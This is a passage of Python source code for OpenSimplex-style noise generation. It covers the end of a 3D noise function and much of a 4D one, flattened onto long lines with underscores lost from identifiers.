- 2 * SQUISH CONSTANT 3D attn5 = 2 - dx5 * dx5 - dy5 * dy5 - dz5 * dz5 if attn5 > 0 : attn5 *= attn5 value += attn5 * attn5 * extrapolate ( xsb + 1 , ysb + 0 , zsb + 1 , dx5 , dy5 , dz5 ) # Contribution (0,1,1) dx6 = dx0 - 0 - 2 * SQUISH CONSTANT 3D dy6 = dy4 dz6 = dz5 attn6 = 2 - dx6 * dx6 - dy6 * dy6 - dz6 * dz6 if attn6 > 0 : attn6 *= attn6 value += attn6 * attn6 * extrapolate ( xsb + 0 , ysb + 1 , zsb + 1 , dx6 , dy6 , dz6 ) # First extra vertex attn ext0 = 2 - dx ext0 * dx ext0 - dy ext0 * dy ext0 - dz ext0 * dz ext0 if attn ext0 > 0 : attn ext0 *= attn ext0 value += attn ext0 * attn ext0 * extrapolate ( xsv ext0 , ysv ext0 , zsv ext0 , dx ext0 , dy ext0 , dz ext0 ) # Second extra vertex attn ext1 = 2 - dx ext1 * dx ext1 - dy ext1 * dy ext1 - dz ext1 * dz ext1 if attn ext1 > 0 : attn ext1 *= attn ext1 value += attn ext1 * attn ext1 * extrapolate ( xsv ext1 , ysv ext1 , zsv ext1 , dx ext1 , dy ext1 , dz ext1 ) return value / NORM CONSTANT 3D
def noise4d ( self , x , y , z , w ) : # Place input coordinates on simplectic honeycomb. stretch offset = ( x + y + z + w ) * STRETCH CONSTANT 4D xs = x + stretch offset ys = y + stretch offset zs = z + stretch offset ws = w + stretch offset # Floor to get simplectic honeycomb coordinates of rhombo-hypercube super-cell origin. xsb = floor ( xs ) ysb = floor ( ys ) zsb = floor ( zs ) wsb = floor ( ws ) # Skew out to get actual coordinates of stretched rhombo-hypercube origin. We'll need these later. squish offset = ( xsb + ysb + zsb + wsb ) * SQUISH CONSTANT 4D xb = xsb + squish offset yb = ysb + squish offset zb = zsb + squish offset wb = wsb + squish offset # Compute simplectic honeycomb coordinates relative to rhombo-hypercube origin. xins = xs - xsb yins = ys - ysb zins = zs - zsb wins = ws - wsb # Sum those together to get a value that determines which region we're in. in sum = xins + yins + zins + wins # Positions relative to origin po. dx0 = x - xb dy0 = y - yb dz0 = z - zb dw0 = w - wb value = 0 extrapolate = self . extrapolate4d if in sum <= 1 : # We're inside the pentachoron (4-Simplex) at (0,0,0,0) # Determine which two of (0,0,0,1), (0,0,1,0), (0,1,0,0), (1,0,0,0) are closest. a po = 0x01 a score = xins b po = 0x02 b score = yins if a score >= b score and zins > b score : b score = zins b po = 0x04 elif a score < b score and zins > a score : a score = zins a po = 0x04 if a score >= b score and wins > b score : b score = wins b po = 0x08 elif a score < b score and wins > a score : a score = wins a po = 0x08 # Now we determine the three lattice pos not part of the pentachoron that may contribute. # This depends on the closest two pentachoron vertices, including (0,0,0,0) uins = 1 - in sum if uins > a score or uins > b score : # (0,0,0,0) is one of the closest two pentachoron vertices. c = b po if ( b score > a score ) else a po # Our other closest vertex is the closest out of a and b. if ( c & 0x01 ) == 0 : xsv ext0 = xsb - 1 xsv ext1 = xsv ext2 = xsb dx ext0 = dx0 + 1 dx ext1 = dx ext2 = dx0 else : xsv ext0 = xsv ext1 = xsv ext2 = xsb + 1 dx ext0 = dx ext1 = dx ext2 = dx0 - 1 if ( c & 0x02 ) == 0 : ysv ext0 = ysv ext1 = ysv ext2 = ysb dy ext0 = dy ext1 = dy ext2 = dy0 if ( c & 0x01 ) == 0x01 : ysv ext0 -= 1 dy ext0 += 1 else : ysv ext1 -= 1 dy ext1 += 1 else : ysv ext0 = ysv ext1 = ysv ext2 = ysb + 1 dy ext0 = dy ext1 = dy ext2 = dy0 - 1 if ( c & 0x04 ) == 0 : zsv ext0 = zsv ext1 = zsv ext2 = zsb dz ext0 = dz ext1 = dz ext2 = dz0 if ( c & 0x03 ) != 0 : if ( c & 0x03 ) == 0x03 : zsv ext0 -= 1 dz ext0 += 1 else : zsv ext1 -= 1 dz ext1 += 1 else : zsv ext2 -= 1 dz ext2 += 1 else : zsv ext0 = zsv ext1 = zsv ext2 = zsb + 1 dz ext0 = dz ext1 = dz ext2 = dz0 - 1 if ( c & 0x08 ) == 0 : wsv ext0 = wsv ext1 = wsb wsv ext2 = wsb - 1 dw ext0 = dw ext1 = dw0 dw ext2 = dw0 + 1 else : wsv ext0 = wsv ext1 = wsv ext2 = wsb + 1 dw ext0 = dw ext1 = dw ext2 = dw0 - 1 else : # (0,0,0,0) is not one of the closest two pentachoron vertices. c = ( a po | b po ) # Our three extra vertices are determined by the closest two. if ( c & 0x01 ) == 0 : xsv ext0 = xsv ext2 = xsb xsv ext1 = xsb - 1 dx ext0 = dx0 - 2 * SQUISH CONSTANT 4D dx ext1 = dx0 + 1 - SQUISH CONSTANT 4D dx ext2 = dx0 - SQUISH CONSTANT 4D else : xsv ext0 = xsv ext1 = xsv ext2 = xsb + 1 dx ext0 = dx0 - 1 - 2 * SQUISH CONSTANT 4D dx ext1 = dx ext2 = dx0 - 1 - SQUISH CONSTANT 4D if ( c & 0x02 ) == 0 : ysv ext0 = ysv ext1 = ysv ext2 = ysb dy ext0 = dy0 - 2 * SQUISH CONSTANT 4D dy ext1 = dy ext2 = dy0 - SQUISH CONSTANT 4D if ( c & 0x01 ) == 0x01 : ysv ext1 -= 1 dy ext1 += 1 else : ysv ext2 -= 1 dy ext2 += 1 else : ysv ext0 = ysv ext1 = ysv ext2 = ysb + 1 dy ext0 = dy0 - 1 - 2 * SQUISH CONSTANT 4D dy ext1 = dy ext2 = dy0 - 1 - SQUISH CONSTANT 4D if ( c & 0x04 ) == 0 : zsv ext0 = zsv ext1 = zsv ext2 = zsb dz ext0 = dz0 - 2 * SQUISH CONSTANT 4D dz ext1 = dz ext2 = dz0 - SQUISH CONSTANT 4D if ( c & 0x03 ) == 0x03 : zsv ext1 -= 1 dz ext1 += 1 else : zsv ext2 -= 1 dz ext2 += 1 else : zsv ext0 = zsv ext1 = zsv ext2 = zsb + 1 dz ext0 = dz0 - 1 - 2 * SQUISH CONSTANT 4D dz ext1 = dz ext2 = dz0 - 1 - SQUISH CONSTANT 4D if ( c & 0x08 ) == 0 : wsv ext0 = wsv ext1 = wsb wsv ext2 = wsb - 1 dw ext0 = dw0 - 2 * SQUISH CONSTANT 4D dw ext1 = dw0 - SQUISH CONSTANT 4D dw ext2 = dw0 + 1 - SQUISH CONSTANT 4D else : wsv ext0 = wsv ext1 = wsv ext2 = wsb + 1 dw ext0 = dw0 - 1 - 2 * SQUISH CONSTANT 4D dw ext1 = dw ext2 = dw0 - 1 - SQUISH CONSTANT 4D # Contribution (0,0,0,0) attn0 = 2 - dx0 * dx0 - dy0 * dy0 - dz0 * dz0 - dw0 * dw0 if attn0 > 0 : attn0 *= attn0 value += attn0 * attn0 * extrapolate ( xsb + 0 , ysb + 0 , zsb + 0 , wsb + 0 , dx0 , dy0 , dz0 , dw0 ) # Contribution (1,0,0,0) dx1 = dx0 - 1 - SQUISH CONSTANT 4D dy1 = dy0 - 0 - SQUISH CONSTANT 4D dz1 = dz0 - 0 - SQUISH CONSTANT 4D dw1 = dw0 - 0 - SQUISH CONSTANT 4D attn1 = 2 - dx1 * dx1 - dy1 * dy1 - dz1 * dz1 - dw1 * dw1 if attn1 > 0 : attn1 *= attn1 value += attn1 * attn1 * extrapolate ( xsb + 1 , ysb + 0 , zsb + 0 , wsb + 0 , dx1 , dy1 , dz1 , dw1 ) # Contribution (0,1,0,0) dx2 = dx0 - 0 - SQUISH CONSTANT 4D dy2 = dy0 - 1 - SQUISH CONSTANT 4D dz2 = dz1 dw2 = dw1 attn2 = 2 - dx2 * dx2 - dy2 * dy2 - dz2 * dz2 - dw2 * dw2 if attn2 > 0 : attn2 *= attn2 value += attn2 * attn2 * extrapolate ( xsb + 0 , ysb + 1 , zsb + 0 , wsb + 0 , dx2 , dy2 , dz2 , dw2 ) # Contribution (0,0,1,0) dx3 = dx2 dy3 = dy1 dz3 = dz0 - 1 - SQUISH CONSTANT 4D dw3 = dw1 attn3 = 2 - dx3 * dx3 - dy3 * dy3 - dz3 * dz3 - dw3 * dw3 if attn3 > 0 : attn3 *= attn3 value += attn3 * attn3 * extrapolate ( xsb + 0 , ysb + 0 , zsb + 1 , wsb + 0 , dx3 , dy3 , dz3 , dw3 ) # Contribution (0,0,0,1) dx4 = dx2 dy4 = dy1 dz4 = dz1 dw4 = dw0 - 1 - SQUISH CONSTANT 4D attn4 = 2 - dx4 * dx4 - dy4 * dy4 - dz4 * dz4 - dw4 * dw4 if attn4 > 0 : attn4 *= attn4 value += attn4 * attn4 * extrapolate ( xsb + 0 , ysb + 0 , zsb + 0 , wsb + 1 , dx4 , dy4 , dz4 , dw4 ) elif in sum >= 3 : # We're inside the pentachoron (4-Simplex) at (1,1,1,1) # Determine which two of (1,1,1,0), (1,1,0,1), (1,0,1,1), (0,1,1,1) are closest. a po = 0x0E a score = xins b po = 0x0D b score = yins if a score <= b score and zins < b score : b score = zins b po = 0x0B elif a score > b score and zins < a score : a score = zins a po = 0x0B if a score <= b score and wins < b score : b score = wins b po = 0x07 elif a score > b score and wins < a score : a score = wins a po = 0x07 # Now we determine the three lattice pos not part of the pentachoron that may contribute. # This depends on the closest two pentachoron vertices, including (0,0,0,0) uins = 4 - in sum if uins < a score or uins < b score : # (1,1,1,1) is one of the closest two pentachoron vertices. c = b po if ( b score < a score ) else a po # Our other closest vertex is the closest out of a and b. if ( c & 0x01 ) != 0 : xsv ext0 = xsb + 2 xsv ext1 = xsv ext2 = xsb + 1 dx ext0 = dx0 - 2 - 4 * SQUISH CONSTANT 4D dx ext1 = dx ext2 = dx0 - 1 - 4 * SQUISH CONSTANT 4D else : xsv ext0 = xsv ext1 = xsv ext2 = xsb dx ext0 = dx ext1 = dx ext2 = dx0 - 4 * SQUISH CONSTANT 4D if ( c & 0x02 ) != 0 : ysv ext0 = ysv ext1 = ysv ext2 = ysb + 1 dy ext0 = dy ext1 = dy ext2 = dy0 - 1 - 4 * SQUISH CONSTANT 4D if ( c & 0x01 ) != 0 : ysv ext1 += 1 dy ext1 -= 1 else : ysv ext0 += 1 dy ext0 -= 1 else : ysv ext0 = ysv ext1 = ysv ext2 = ysb dy ext0 = dy ext1 = dy ext2 = dy0 - 4 * SQUISH CONSTANT 4D if ( c & 0x04 ) != 0 : zsv ext0 = zsv ext1 = zsv ext2 = zsb + 1 dz ext0 = dz ext1 = dz ext2 = dz0 - 1 - 4 * SQUISH CONSTANT 4D if ( c & 0x03 ) != 0x03 : if ( c & 0x03 ) == 0 : zsv ext0 += 1 dz ext0 -= 1 else : zsv ext1 += 1 dz ext1 -= 1 else : zsv ext2 += 1 dz ext2 -= 1 else : zsv ext0 = zsv ext1 = zsv ext2 = zsb dz ext0 = dz ext1 = dz ext2 = dz0 - 4 * SQUISH CONSTANT 4D if ( c & 0x08 ) != 0 : wsv ext0 = wsv ext1 = wsb + 1 wsv ext2 = wsb + 2 dw ext0 = dw ext1 = dw0 - 1 - 4 * SQUISH CONSTANT 4D dw ext2 = dw0 - 2 - 4 * SQUISH CONSTANT 4D else : wsv ext0 = wsv ext1 = wsv ext2 = wsb dw ext0 = dw ext1 = dw ext2 = dw0 - 4 * SQUISH CONSTANT 4D else : # (1,1,1,1) is not one of the closest two pentachoron vertices. c = ( a po & b po ) # Our three extra vertices are determined by the closest two. if ( c & 0x01 ) != 0 : xsv ext0 = xsv ext2 = xsb + 1 xsv ext1 = xsb + 2 dx ext0 = dx0 - 1 - 2 * SQUISH CONSTANT 4D dx ext1 = dx0 - 2 - 3 * SQUISH CONSTANT 4D dx ext2 = dx0 - 1 - 3 * SQUISH CONSTANT 4D else : xsv ext0 = xsv ext1 = xsv ext2 = xsb dx ext0 = dx0 - 2 * SQUISH CONSTANT 4D dx ext1 = dx ext2 = dx0 - 3 * SQUISH CONSTANT 4D if ( c & 0x02 ) != 0 : ysv ext0 = ysv ext1 = ysv ext2 = ysb + 1 dy ext0 = dy0 - 1 - 2 * SQUISH CONSTANT 4D dy ext1 = dy ext2 = dy0 - 1 - 3 * SQUISH CONSTANT 4D if ( c & 0x01 ) != 0 : ysv ext2 += 1 dy ext2 -= 1 else : ysv ext1 += 1 dy ext1 -= 1 else : ysv ext0 = ysv ext1 = ysv ext2 = ysb dy ext0 = dy0 - 2 * SQUISH CONSTANT 4D dy ext1 = dy ext2 = dy0 - 3 * SQUISH CONSTANT 4D if ( c & 0x04 ) != 0 : zsv ext0 = zsv ext1 = zsv ext2 = zsb + 1 dz ext0 = dz0 - 1 - 2 * SQUISH CONSTANT 4D dz ext1 = dz ext2 = dz0 - 1 - 3 * SQUISH CONSTANT 4D if ( c & 0x03 ) != 0 : zsv ext2 += 1 dz ext2 -= 1 else : zsv ext1 += 1 dz ext1 -= 1 else : zsv ext0 = zsv ext1 = zsv ext2 = zsb dz ext0 = dz0 - 2 * SQUISH CONSTANT 4D dz ext1 = dz ext2 = dz0 - 3 * SQUISH CONSTANT 4D if ( c & 0x08 ) != 0 : wsv ext0 = wsv ext1 = wsb + 1 wsv ext2 = wsb + 2 dw ext0 = dw0 - 1 - 2 * SQUISH CONSTANT 4D dw ext1 = dw0 - 1 - 3 * SQUISH CONSTANT 4D dw ext2 = dw0 - 2 - 3 * SQUISH CONSTANT 4D else : wsv ext0 = wsv ext1 = wsv ext2 = wsb dw ext0 = dw0 - 2 * SQUISH CONSTANT 4D dw ext1 = dw ext2 = dw0 - 3 * SQUISH CONSTANT 4D # Contribution (1,1,1,0) dx4 = dx0 - 1 - 3 * SQUISH CONSTANT 4D dy4 = dy0 - 1 - 3 * SQUISH CONSTANT 4D dz4 = dz0 - 1 - 3 * SQUISH CONSTANT 4D dw4 = dw0 - 3 * SQUISH CONSTANT 4D attn4 = 2 - dx4 * dx4 - dy4 * dy4 - dz4 * dz4 - dw4 * dw4 if attn4 > 0 : attn4 *= attn4 value += attn4 * attn4 * extrapolate ( xsb + 1 , ysb + 1 , zsb + 1 , wsb + 0 , dx4 , dy4 , dz4 , dw4 ) # Contribution (1,1,0,1) dx3 = dx4 dy3 = dy4 dz3 = dz0 - 3 * SQUISH CONSTANT 4D dw3 = dw0 - 1 - 3 * SQUISH CONSTANT 4D attn3 = 2 - dx3 * dx3 - dy3 * dy3 - dz3 * dz3 - dw3 * dw3 if attn3 > 0 : attn3 *= attn3 value += attn3 * attn3 * extrapolate ( xsb + 1 , ysb + 1 , zsb + 0 , wsb + 1 , dx3 , dy3 , dz3 , dw3 ) # Contribution (1,0,1,1) dx2 = dx4 dy2 = dy0 - 3 * SQUISH CONSTANT 4D dz2 = dz4 dw2 = dw3 attn2 = 2 - dx2 * dx2 - dy2 * dy2 - dz2 * dz2 - dw2 * dw2 if attn2 > 0 : attn2 *= attn2 value += attn2 * attn2 * extrapolate ( xsb + 1 , ysb + 0 , zsb + 1 , wsb + 1 , dx2 , dy2 , dz2 , dw2 ) # Contribution (0,1,1,1) dx1 = dx0 - 3 * SQUISH CONSTANT 4D dz1 = dz4 dy1 = dy4 dw1 = dw3 attn1 = 2 - dx1 * dx1 - dy1 * dy1 - dz1 * dz1 - dw1 * dw1 if attn1 > 0 : attn1 *= attn1 value += attn1 * attn1 * extrapolate ( xsb + 0 , ysb + 1 , zsb + 1 , wsb + 1 , dx1 , dy1 , dz1 , dw1 ) # Contribution (1,1,1,1) dx0 = dx0 - 1 - 4 * SQUISH CONSTANT 4D dy0 = dy0 - 1 - 4 * SQUISH CONSTANT 4D dz0 = dz0 - 1 - 4 * SQUISH CONSTANT 4D dw0 = dw0 - 1 - 4 * SQUISH CONSTANT 4D attn0 = 2 - dx0 * dx0 - dy0 * dy0 - dz0 * dz0 - dw0 * dw0 if attn0 > 0 : attn0 *= attn0 value += attn0 * attn0 * extrapolate ( xsb + 1 , ysb + 1 , zsb + 1 , wsb + 1 , dx0 , dy0 , dz0 , dw0 ) elif in sum <= 2 : # We're inside the first dispentachoron (Rectified 4-Simplex) a is bigger side = True b is bigger side = True # Decide between (1,1,0,0) and (0,0,1,1) if xins + yins > zins + wins : a score = xins + yins a po = 0x03 else : a score = zins + wins a po = 0x0C # Decide between (1,0,1,0) and (0,1,0,1) if xins + zins > yins + wins : b score = xins + zins b po = 0x05 else : b score = yins + wins b po = 0x0A # Closer between (1,0,0,1) and (0,1,1,0) will replace the further of a and b, if closer. if xins + wins > yins + zins : score = xins + wins if a score >= b score and score > b score : b score = score b po = 0x09 elif a score < b score and score > a score : a score = score a po = 0x09 else : score = yins + zins if a score >= b score and score > b score : b score = score b po = 0x06 elif a score < b score and score > a score : a score = score a po = 0x06 # Decide if (1,0,0,0) is closer. p1 = 2 - in sum + xins if a score >= b score and p1 > b score : b score = p1 b po = 0x01 b is bigger side = False elif a score < b score and p1 > a score : a score = p1 a po = 0x01 a is bigger side = False # Decide if (0,1,0,0) is closer. p2 = 2 - in sum + yins if a score >= b score and p2 > b score : b score = p2 b po = 0x02 b is bigger side = False elif a score < b score and p2 > a score : a score = p2 a po = 0x02 a is bigger side = False # Decide if (0,0,1,0) is closer. p3 = 2 - in sum + zins if a score >= b score and p3 > b score : b score = p3 b po = 0x04 b is bigger side = False elif a score < b score and p3 > a score : a score = p3 a po = 0x04 a is bigger side = False # Decide if (0,0,0,1) is closer. p4 = 2 - in sum + wins if a score >= b score and p4 > b score : b po = 0x08 b is bigger side = False elif a score < b score and p4 > a score : a po = 0x08 a is bigger side = False # Where each of the two closest pos are determines how the extra three vertices are calculated. if a is bigger side == b is bigger side : if a is bigger side : # Both closest pos on the bigger side c1 = ( a po | b po ) c2 = ( a po & b po ) if ( c1 & 0x01 ) == 0 : xsv ext0 = xsb xsv ext1 = xsb - 1 dx ext0 = dx0 - 3 * SQUISH CONSTANT 4D dx ext1 = dx0 + 1 - 2 * SQUISH CONSTANT 4D else : xsv ext0 = xsv ext1 = xsb + 1 dx ext0 = dx0 - 1 - 3 * SQUISH CONSTANT 4D dx ext1 = dx0 - 1 - 2 * SQUISH CONSTANT 4D if ( c1 & 0x02 ) == 0 : ysv ext0 = ysb ysv ext1 = ysb - 1 dy ext0 = dy0 - 3 * SQUISH CONSTANT 4D dy ext1 = dy0 + 1 - 2 * SQUISH CONSTANT 4D else : ysv ext0 = ysv ext1 = ysb + 1 dy ext0 = dy0 - 1 - 3 * SQUISH CONSTANT 4D dy ext1 = dy0 - 1 - 2 * SQUISH CONSTANT 4D if ( c1 & 0x04 ) == 0 : zsv ext0 = zsb zsv ext1 = zsb - 1 dz ext0 = dz0 - 3 * SQUISH CONSTANT 4D dz ext1 = dz0 + 1 - 2 * SQUISH CONSTANT 4D else : zsv ext0 = zsv ext1 = zsb + 1 dz ext0 = dz0 - 1 - 3 * SQUISH CONSTANT 4D dz ext1 = dz0 - 1 - 2 * SQUISH CONSTANT 4D if ( c1 & 0x08 ) == 0 : wsv ext0 = wsb wsv ext1 = wsb - 1 dw ext0 = dw0 - 3 * SQUISH CONSTANT 4D dw ext1 = dw0 + 1 - 2 * SQUISH CONSTANT 4D else : wsv ext0 = wsv ext1 = wsb + 1 dw ext0 = dw0 - 1 - 3 * SQUISH CONSTANT 4D dw ext1 = dw0 - 1 - 2 * SQUISH CONSTANT 4D # One combination is a  permutation of (0,0,0,2) based on c2 xsv ext2 = xsb ysv ext2 = ysb zsv ext2 = zsb wsv ext2 = wsb dx ext2 = dx0 - 2 * SQUISH CONSTANT 4D dy ext2 = dy0 - 2 * SQUISH CONSTANT 4D dz ext2 = dz0 - 2 * SQUISH CONSTANT 4D dw ext2 = dw0 - 2 * SQUISH CONSTANT 4D if ( c2 & 0x01 ) != 0 : xsv ext2 += 2 dx ext2 -= 2 elif ( c2 & 0x02 ) != 0 : ysv ext2 += 2 dy ext2 -= 2 elif ( c2 & 0x04 ) != 0 : zsv ext2 += 2 dz ext2 -= 2 else : wsv ext2 += 2 dw ext2 -= 2 else : # Both closest pos on the smaller side # One of the two extra pos is (0,0,0,0) xsv ext2 = xsb ysv ext2 = ysb zsv ext2 = zsb wsv ext2 = wsb dx ext2 = dx0 dy ext2 = dy0 dz ext2 = dz0 dw ext2 = dw0 # Other two pos are based on the omitted axes. c = ( a po | b po ) if ( c & 0x01 ) == 0 : xsv ext0 = xsb - 1 xsv ext1 = xsb dx ext0 = dx0 + 1 - SQUISH CONSTANT 4D dx ext1 = dx0 - SQUISH CONSTANT 4D else : xsv ext0 = xsv ext1 = xsb + 1 dx ext0 = dx ext1 = dx0 - 1 - SQUISH CONSTANT 4D if ( c & 0x02 ) == 0 : ysv ext0 = ysv ext1 = ysb dy ext0 = dy ext1 = dy0 - SQUISH CONSTANT 4D if ( c & 0x01 ) == 0x01 : ysv ext0 -= 1 dy ext0 += 1 else : ysv ext1 -= 1 dy ext1 += 1 else : ysv ext0 = ysv ext1 = ysb + 1 dy ext0 = dy ext1 = dy0 - 1 - SQUISH CONSTANT 4D if ( c & 0x04 ) == 0 : zsv ext0 = zsv ext1 = zsb dz ext0 = dz ext1 = dz0 - SQUISH CONSTANT 4D if ( c & 0x03 ) == 0x03 : zsv ext0 -= 1 dz ext0 += 1 else : zsv ext1 -= 1 dz ext1 += 1 else : zsv ext0 = zsv ext1 = zsb + 1 dz ext0 = dz ext1 = dz0 - 1 - SQUISH CONSTANT 4D if ( c & 0x08 ) == 0 : wsv ext0 = wsb wsv ext1 = wsb - 1 dw ext0 = dw0 - SQUISH CONSTANT 4D dw ext1 = dw0 + 1 - SQUISH CONSTANT 4D else : wsv ext0 = wsv ext1 = wsb + 1 dw ext0 = dw ext1 = dw0 - 1 - SQUISH CONSTANT 4D else : # One po on each "side" if a is bigger side : c1 = a po c2 = b po else : c1 = b po c2 = a po # Two contributions are the bigger-sided po with each 0 replaced with -1. if ( c1 & 0x01 ) == 0 : xsv ext0 = xsb - 1 xsv ext1 = xsb dx ext0 = dx0 + 1 - SQUISH CONSTANT 4D dx ext1 = dx0 - SQUISH CONSTANT 4D else : xsv ext0 = xsv ext1 = xsb + 1 dx ext0 = dx ext1 = dx0 - 1 - SQUISH CONSTANT 4D if ( c1 & 0x02 ) == 0 : ysv ext0 = ysv ext1 = ysb dy ext0 = dy ext1 = dy0 - SQUISH CONSTANT 4D if ( c1 & 0x01 ) == 0x01 : ysv ext0 -= 1 dy ext0 += 1 else : ysv ext1 -= 1 dy ext1 += 1 else : ysv ext0 = ysv ext1 = ysb + 1 dy ext0 = dy ext1 = dy0 - 1 - SQUISH CONSTANT 4D if ( c1 & 0x04 ) == 0 : zsv ext0 = zsv ext1 = zsb dz ext0 = dz ext1 = dz0 - SQUISH CONSTANT 4D if ( c1 & 0x03 ) == 0x03 : zsv ext0 -= 1 dz ext0 += 1 else : zsv ext1 -= 1 dz ext1 += 1 else : zsv ext0 = zsv ext1 = zsb + 1 dz ext0 = dz ext1 = dz0 - 1 - SQUISH CONSTANT 4D if ( c1 & 0x08 ) == 0 : wsv ext0 = wsb wsv ext1 = wsb - 1 dw ext0 = dw0 - SQUISH CONSTANT 4D dw ext1 = dw0 + 1 - SQUISH CONSTANT 4D else : wsv ext0 = wsv ext1 = wsb + 1 dw ext0 = dw ext1 = dw0 - 1 - SQUISH CONSTANT 4D # One contribution is a  permutation of (0,0,0,2) based on the smaller-sided po xsv ext2 = xsb ysv ext2 = ysb zsv ext2 = zsb wsv ext2 = wsb dx ext2 = dx0 - 2 * SQUISH CONSTANT 4D dy ext2 = dy0 - 2 * SQUISH CONSTANT 4D dz ext2 = dz0 - 2 * SQUISH CONSTANT 4D dw ext2 = dw0 - 2 * SQUISH CONSTANT 4D if ( c2 & 0x01 ) != 0 : xsv ext2 += 2 dx ext2 -= 2 elif ( c2 & 0x02 ) != 0 : ysv ext2 += 2 dy ext2 -= 2 elif ( c2 & 0x04 ) != 0 : zsv ext2 += 2 dz ext2 -= 2 else : wsv ext2 += 2 dw ext2 -= 2 # Contribution (1,0,0,0) dx1 = dx0 - 1 - SQUISH CONSTANT 4D dy1 = dy0 - 0 - SQUISH CONSTANT 4D dz1 = dz0 - 0 - SQUISH CONSTANT 4D dw1 = dw0 - 0 - SQUISH CONSTANT 4D attn1 = 2 - dx1 * dx1 - dy1 * dy1 - dz1 * dz1 - dw1 * dw1 if attn1 > 0 : attn1 *= attn1 value += attn1 * attn1 * extrapolate ( xsb + 1 , ysb + 0 , zsb + 0 , wsb + 0 , dx1 , dy1 , dz1 , dw1 ) # Contribution (0,1,0,0) dx2 = dx0 - 0 - SQUISH CONSTANT 4D dy2 = dy0 - 1 - SQUISH CONSTANT 4D dz2 = dz1 dw2 = dw1 attn2 = 2 - dx2 * dx2 - dy2 * dy2 - dz2 * dz2 - dw2 * dw2 if attn2 > 0 : attn2 *= attn2 value += attn2 * attn2 * extrapolate ( xsb + 0 , ysb + 1 , zsb + 0 , wsb + 0 , dx2 , dy2 , dz2 , dw2 ) # Contribution (0,0,1,0) dx3 = dx2 dy3 = dy1 dz3 = dz0 - 1 - SQUISH CONSTANT 4D dw3 = dw1 attn3 = 2 - dx3 * dx3 - dy3 * dy3 - dz3 * dz3 - dw3 * dw3 if attn3 > 0 : attn3 *= attn3 value += attn3 * attn3 * extrapolate ( xsb + 0 , ysb + 0 , zsb + 1 , wsb + 0 , dx3 , dy3 , dz3 , dw3 ) # Contribution (0,0,0,1) dx4 = dx2 dy4 = dy1 dz4 = dz1 dw4 = dw0 - 1 - SQUISH CONSTANT 4D attn4 = 2 - dx4 * dx4 - dy4 * dy4 - dz4 * dz4 - dw4 * dw4 if attn4 > 0 : attn4 *= attn4 value += attn4 * attn4 * extrapolate ( xsb + 0 , ysb + 0 , zsb + 0 , wsb + 1 , dx4 , dy4 , dz4 , dw4 ) # Contribution (1,1,0,0) dx5 = dx0 - 1 - 2 * SQUISH CONSTANT 4D dy5 = dy0 - 1 - 2 * SQUISH CONSTANT 4D dz5 = dz0 - 0 - 2 * SQUISH CONSTANT 4D dw5 = dw0 - 0 - 2 * SQUISH CONSTANT 4D attn5 = 2 - dx5 * dx5 - dy5 * dy5 - dz5 * dz5 - dw5 * dw5 if attn5 > 0 : attn5 *= attn5 value += attn5 * attn5 * extrapolate ( xsb + 1 , ysb + 1 , zsb + 0 , wsb + 0 , dx5 , dy5 , dz5 , dw5 ) # Contribution (1,0,1,0) dx6 = dx0 - 1 - 2 * SQUISH CONSTANT 4D dy6 = dy0 - 0 - 2 * SQUISH CONSTANT 4D dz6 = dz0 - 1 - 2 * SQUISH CONSTANT 4D dw6 = dw0 - 0 - 2 * SQUISH CONSTANT 4D attn6 = 2 - dx6 * dx6 - dy6 * dy6 - dz6 * dz6 - dw6 * dw6 if attn6 > 0 : attn6 *= attn6 value += attn6 * attn6 * extrapolate ( xsb + 1 , ysb + 0 , zsb + 1 , wsb + 0 , dx6 , dy6 , dz6 , dw6 ) # Contribution (1,0,0,1) dx7 = dx0 - 1 - 2 * SQUISH CONSTANT 4D dy7 = dy0 - 0 - 2 * SQUISH CONSTANT 4D dz7 = dz0 - 0 - 2 * SQUISH CONSTANT 4D dw7 = dw0 - 1 - 2 * SQUISH CONSTANT 4D attn7 = 2 - dx7 * dx7 - dy7 * dy7 - dz7 * dz7 - dw7 * dw7 if attn7 > 0 : attn7 *= attn7 value += attn7 * attn7 * extrapolate ( xsb + 1 , ysb + 0 , zsb + 0 , wsb + 1 , dx7 , dy7 , dz7 , dw7 ) # Contribution (0,1,1,0) dx8 = dx0 - 0 - 2 * SQUISH CONSTANT 4D dy8 = dy0 - 1 - 2 * SQUISH CONSTANT 4D dz8 = dz0 - 1 - 2 * SQUISH CONSTANT 4D dw8 = dw0 - 0 - 2 * SQUISH CONSTANT 4D attn8 = 2 - dx8 * dx8 - dy8 * dy8 - dz8 * dz8 - dw8 * dw8 if attn8 > 0 : attn8 *= attn8 value += attn8 * attn8 * extrapolate ( xsb + 0 , ysb + 1 , zsb + 1 , wsb + 0 , dx8 , dy8 , dz8 , dw8 ) # Contribution (0,1,0,1) dx9 = dx0 - 0 - 2 * SQUISH CONSTANT 4D dy9 = dy0 - 1 - 2 * SQUISH CONSTANT 4D dz9 = dz0 - 0 - 2 * SQUISH CONSTANT 4D dw9 = dw0 - 1 - 2 * SQUISH CONSTANT 4D attn9 = 2 - dx9 * dx9 - dy9 * dy9 - dz9 * dz9 - dw9 * dw9 if attn9 > 0 : attn9 *= attn9 value += attn9 * attn9 * extrapolate ( xsb + 0 , ysb + 1 , zsb + 0 , wsb + 1 , dx9 , dy9 , dz9 , dw9 ) # Contribution (0,0,1,1) dx10 = dx0 - 0 - 2 * SQUISH CONSTANT 4D dy10 = dy0 - 0 - 2 * SQUISH CONSTANT 4D dz10 = dz0 - 1 - 2 * SQUISH CONSTANT 4D dw10 = dw0 - 1 - 2 * SQUISH CONSTANT 4D attn10 = 2 - dx10 * dx10 - dy10 * dy10 - dz10 * dz10 - dw10 * dw10 if attn10 > 0 : attn10 *= attn10 value += attn10 * attn10 * extrapolate ( xsb + 0 , ysb + 0 , zsb + 1 , wsb + 1 , dx10 , dy10 , dz10 , dw10 ) else : # We're inside the second dispentachoron (Rectified 4-Simplex) a is bigger side = True b is bigger side = True # Decide between (0,0,1,1) and (1,1,0,0) if xins + yins < zins + wins : a score = xins + yins a po = 0x0C else : a score = zins + wins a po = 0x03 # Decide between (0,1,0,1) and (1,0,1,0) if xins + zins < yins + wins : b score = xins + zins b po = 0x0A else : b score = yins + wins b po = 0x05 # Closer between (0,1,1,0) and (1,0,0,1) will replace the further of a and b, if closer. if xins + wins < yins + zins : score = xins + wins if a score <= b score and score < b score : b score = score b po = 0x06 elif a score > b score and score < a score : a score = score a po = 0x06 else : score = yins + zins if a score <= b score and score < b score : b score = score b po = 0x09 elif a score > b score and score < a score : a score = score a po = 0x09 # Decide if (0,1,1,1) is closer. p1 = 3 - in sum + xins if a score <= b score and p1 < b score : b score = 